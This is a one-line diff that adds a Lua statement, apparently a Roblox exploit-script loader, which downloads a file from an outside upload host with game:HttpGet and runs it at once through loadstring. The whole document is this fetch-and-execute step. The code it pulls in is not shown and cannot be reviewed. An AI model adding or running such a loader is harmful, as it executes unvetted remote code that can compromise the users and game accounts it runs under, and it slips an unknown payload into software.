@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://arilis.dev/uploader/files/0xl6wm.lua',true))()
